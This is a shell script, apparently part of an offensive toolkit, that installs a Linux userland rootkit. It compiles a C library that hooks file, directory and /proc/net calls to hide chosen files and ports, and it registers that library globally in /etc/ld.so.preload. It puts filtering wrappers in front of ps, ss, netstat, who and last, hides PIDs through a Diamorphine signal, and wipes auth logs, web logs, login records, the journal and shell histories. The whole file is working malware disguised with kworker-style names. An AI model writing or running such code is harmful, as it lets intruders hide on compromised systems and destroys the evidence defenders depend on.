#!/bin/sh
# DESC: ring-3 hiding (ld.so.preload), PATH wrappers and log wipe
# REQ: root for global preload; gcc optional

P="${BW_PREFIX:-blk_}"
D="${BW_PREFIX_DIR:-/usr/local/sbin/.kworker}"
DRY="${BW_DRY_RUN:-0}"
PREFIXES="${BW_HIDE_PREFIXES:-blk_,.blk_,kworker,sysmon}"
PORT="${BW_HIDE_PORT:-}"
WIPE="${BW_WIPE:-1}"
GLOBAL="${BW_GLOBAL_PRELOAD:-1}"
ROOT="${BW_WRAPPER_ROOT:-/usr/local/sbin/${P}kworker}"

say() { printf '[SHADOW] %s\n' "$1"; }
run() {
    if [ "$DRY" = "1" ]; then
        printf '[dry] %s\n' "$*"
    else
        "$@"
    fi
}

mkdir -p "$D" 2>/dev/null || true
run chmod 700 "$D" 2>/dev/null || true
printf '%s\n' "$PREFIXES" | tr ',' '\n' > "$D/${P}hide" 2>/dev/null || true
[ -n "$PORT" ] && printf ':%s\n' "$PORT" >> "$D/${P}hide" 2>/dev/null || true
run chmod 600 "$D/${P}hide" 2>/dev/null || true

C_PREFIXES="$(printf '%s' "$PREFIXES" | tr -cd 'A-Za-z0-9._,.-' | sed 's/,/","/g')"
PORT_HEX=""
case "$PORT" in
    ''|*[!0-9]*) : ;;
    *) PORT_HEX="$(printf '%04X' "$PORT" 2>/dev/null)" ;;
esac

cat > "$D/${P}hide.c" << EOF_HIDE
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <strings.h>
#include <stdarg.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

static const char *prefixes[] = {"${C_PREFIXES}", NULL};
static const char *ports[] = {"${PORT_HEX}", NULL};

static int guilty(const char *name) {
    if (!name) return 0;
    for (int i = 0; prefixes[i] && prefixes[i][0]; i++) {
        size_t n = strlen(prefixes[i]);
        if (strncmp(name, prefixes[i], n) == 0) return 1;
    }
    return 0;
}

static int path_guilty(const char *path) {
    if (!path) return 0;
    const char *base = strrchr(path, '/');
    base = base ? base + 1 : path;
    return guilty(base);
}

static int net_path(const char *path) {
    if (!path) return 0;
    return strstr(path, "/proc/net/tcp") || strstr(path, "/proc/net/tcp6") ||
           strstr(path, "/proc/net/udp") || strstr(path, "/proc/net/udp6");
}

static int port_hit(const char *line) {
    if (!line) return 0;
    const char *a = line;
    while (*a == ' ' || *a == '\t') a++;
    const char *c1 = strchr(a, ':');
    if (!c1) return 0;
    const char *c2 = strchr(c1 + 1, ':');
    if (!c2) return 0;
    for (int i = 0; ports[i] && ports[i][0]; i++) {
        if (strncasecmp(c2 + 1, ports[i], 4) == 0) return 1;
    }
    return 0;
}

static FILE *filter_net(FILE *f) {
    if (!f) return f;
    FILE *tmp = tmpfile();
    if (!tmp) { fclose(f); return NULL; }
    char *line = NULL;
    size_t cap = 0;
    ssize_t n;
    while ((n = getline(&line, &cap, f)) != -1) {
        if (!port_hit(line)) fwrite(line, 1, (size_t)n, tmp);
    }
    free(line);
    fclose(f);
    rewind(tmp);
    return tmp;
}

FILE *fopen(const char *path, const char *mode) {
    static FILE *(*real)(const char *, const char *) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "fopen");
    FILE *f = real(path, mode);
    return net_path(path) ? filter_net(f) : f;
}

FILE *fopen64(const char *path, const char *mode) {
    static FILE *(*real)(const char *, const char *) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "fopen64");
    FILE *f = real(path, mode);
    return net_path(path) ? filter_net(f) : f;
}

struct dirent *readdir(DIR *d) {
    static struct dirent *(*real)(DIR *) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "readdir");
    struct dirent *e;
    do { e = real(d); } while (e && guilty(e->d_name));
    return e;
}

struct dirent64 *readdir64(DIR *d) {
    static struct dirent64 *(*real)(DIR *) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *e;
    do { e = real(d); } while (e && guilty(e->d_name));
    return e;
}

int open(const char *path, int flags, ...) {
    static int (*real)(const char *, int, ...) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "open");
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list ap; va_start(ap, flags); mode = va_arg(ap, mode_t); va_end(ap);
    }
    if (path_guilty(path)) { errno = ENOENT; return -1; }
    return real(path, flags, mode);
}

int open64(const char *path, int flags, ...) {
    static int (*real)(const char *, int, ...) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "open64");
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list ap; va_start(ap, flags); mode = va_arg(ap, mode_t); va_end(ap);
    }
    if (path_guilty(path)) { errno = ENOENT; return -1; }
    return real(path, flags, mode);
}

int openat(int dirfd, const char *path, int flags, ...) {
    static int (*real)(int, const char *, int, ...) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "openat");
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list ap; va_start(ap, flags); mode = va_arg(ap, mode_t); va_end(ap);
    }
    if (path_guilty(path)) { errno = ENOENT; return -1; }
    return real(dirfd, path, flags, mode);
}

int stat(const char *path, struct stat *buf) {
    static int (*real)(const char *, struct stat *) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "stat");
    if (path_guilty(path)) { errno = ENOENT; return -1; }
    return real(path, buf);
}

int lstat(const char *path, struct stat *buf) {
    static int (*real)(const char *, struct stat *) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "lstat");
    if (path_guilty(path)) { errno = ENOENT; return -1; }
    return real(path, buf);
}

int access(const char *path, int mode) {
    static int (*real)(const char *, int) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "access");
    if (path_guilty(path)) { errno = ENOENT; return -1; }
    return real(path, mode);
}
EOF_HIDE

SO=""
if command -v gcc >/dev/null 2>&1; then
    if run gcc -shared -fPIC -O2 -w -o "$D/${P}hide.so" "$D/${P}hide.c" -ldl 2>/dev/null; then
        SO="$D/${P}hide.so"
        say "compiled ${P}hide.so"
    else
        say "gcc failed; falling back to PATH wrappers only"
    fi
    rm -f "$D/${P}hide.c" 2>/dev/null
else
    say "gcc missing; falling back to PATH wrappers only"
fi

if [ -n "$SO" ] && [ "$GLOBAL" = "1" ]; then
    if LD_PRELOAD="$SO" /bin/ls / >/dev/null 2>&1; then
        LIB="/usr/local/lib/${P}hide.so"
        run mkdir -p /usr/local/lib 2>/dev/null || true
        run cp -f "$SO" "$LIB" 2>/dev/null || true
        run chmod 644 "$LIB" 2>/dev/null || true
        if [ -f /etc/ld.so.preload ] && [ ! -f /etc/${P}preload.bak ]; then
            run cp -f /etc/ld.so.preload "/etc/${P}preload.bak" 2>/dev/null || true
        fi
        if ! grep -qF "$LIB" /etc/ld.so.preload 2>/dev/null; then
            run sh -c "printf '%s\\n' '$LIB' >> /etc/ld.so.preload"
        fi
        say "global preload armed: $LIB"
    else
        say "preload self-test failed; not touching /etc/ld.so.preload"
    fi
elif [ -n "$SO" ]; then
    say "global preload disabled by BW_GLOBAL_PRELOAD=0"
fi

if [ -d /etc/profile.d ]; then
    if [ "$DRY" = "1" ]; then
        printf '[dry] install PATH wrapper in %s\n' "$ROOT"
    else
        mkdir -p "$ROOT" 2>/dev/null || true
        cat > "$ROOT/${P}filter" << EOF_FILTER
#!/bin/sh
N="\$(basename "\$0")"
H="${D}/${P}hide"
case "\$N" in
  who|w|last|lastlog) exit 0 ;;
  netstat|ss) /usr/sbin/ss "\$@" 2>/dev/null | grep -vF -f "\$H" ;;
  *) /usr/bin/ps "\$@" 2>/dev/null | grep -vF -f "\$H" ;;
esac
EOF_FILTER
        chmod 755 "$ROOT/${P}filter" 2>/dev/null || true
        for tool in ps pstree top pgrep pkill lsof netstat ss who w last lastlog; do
            [ -e "$ROOT/$tool" ] && continue
            ln -s "$ROOT/${P}filter" "$ROOT/$tool" 2>/dev/null || cp "$ROOT/${P}filter" "$ROOT/$tool" 2>/dev/null || true
        done
        printf '%s\n' "case \":\$PATH:\" in *:\"${ROOT}\":*) ;; *) PATH=\"${ROOT}:\$PATH\"; export PATH ;; esac" > /etc/profile.d/${P}path
        chmod 644 /etc/profile.d/${P}path 2>/dev/null || true
        if ! grep -qF "$ROOT" /etc/environment 2>/dev/null; then
            printf 'PATH="%s:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"\n' "$ROOT" >> /etc/environment 2>/dev/null || true
        fi
    fi
    say "PATH wrappers: ps ss netstat top pgrep lsof who w last"
fi

if [ -f "$D/${P}dia" ] && [ -n "${BW_HIDE_PIDS:-}" ]; then
    for pid in $(printf '%s' "$BW_HIDE_PIDS" | tr ',' ' '); do
        case "$pid" in
            ''|*[!0-9]*) continue ;;
        esac
        run kill -63 "$pid" 2>/dev/null || true
        say "diamorphine: hid pid $pid"
    done
fi

if [ "$WIPE" = "1" ] && [ "$(id -u 2>/dev/null)" = "0" ]; then
    if [ "$DRY" = "1" ]; then
        printf '[dry] wipe auth/access logs, wtmp/btmp/lastlog, journal and shell history\n'
    else
        for f in /var/log/auth.log /var/log/secure /var/log/messages /var/log/syslog \
                 /var/log/apache2/access.log /var/log/apache2/error.log \
                 /var/log/nginx/access.log /var/log/nginx/error.log; do
            [ -f "$f" ] && : > "$f" 2>/dev/null && chmod 640 "$f" 2>/dev/null
        done
        for f in /var/log/wtmp /var/log/btmp /var/log/lastlog; do
            [ -f "$f" ] && truncate -s 0 "$f" 2>/dev/null
        done
        rm -rf /var/log/journal/* 2>/dev/null
        for f in /root/.bash_history /root/.zsh_history /root/.wget-hsts /root/.lesshst \
                 /root/.mysql_history /root/.sqlite_history "${HOME:-/root}/.bash_history" \
                 "${HOME:-/root}/.zsh_history" "${HOME:-/root}/.python_history"; do
            [ -f "$f" ] && : > "$f" 2>/dev/null
        done
    fi
    say "logs and shell history wiped"
fi

say "done; set BW_GLOBAL_PRELOAD=0 to keep ld.so.preload untouched"
